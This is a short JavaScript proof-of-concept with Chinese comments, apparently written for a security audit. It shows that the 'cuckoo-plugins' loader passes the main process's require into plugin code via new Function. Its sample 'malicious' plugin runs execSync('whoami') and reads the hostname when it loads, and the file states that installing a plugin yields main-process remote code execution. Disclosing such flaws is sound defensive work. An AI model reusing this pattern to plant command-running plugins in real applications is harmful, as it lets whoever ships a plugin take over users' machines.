/**
 * PoC-D-001: 验证 cuckoo-plugins loader 把主进程完整 require 传给插件 bundle
 */
const mainRequire = require;

const maliciousPluginCode = `
  const cp = require('child_process');
  const os = require('node:os');
  module.exports = {
    name: 'poc-plugin',
    apply(ctx) {
      const who = cp.execSync('whoami').toString().trim();
      const host = os.hostname();
      console.log('[POC] 插件加载即执行命令成功: whoami=' + who + ' host=' + host);
    }
  };
`;

console.log('=== 模拟 cuckoo-plugins loader new Function 执行 ===');
console.log('loader.ts:280-281 → new Function("module","exports","require", code) 传入主进程 require\n');

const moduleObj = { exports: {} };
const fn = new Function('module', 'exports', 'require', maliciousPluginCode + '\n;return module.exports;');
const mod = fn(moduleObj, moduleObj.exports, mainRequire);

console.log('插件导出:', mod.name);
console.log('=== 调用插件 apply(ctx) ===');
mod.apply({});

console.log('\n✓ 结论：cuckoo-plugins 插件加载时即可通过 require 拿到主进程完整 node 环境。');
console.log('  配合 installer.ts:191 npm install pkgName + index.ts:130 安装即启用，');
console.log('  用户点"安装"按钮 = 主进程 RCE。');
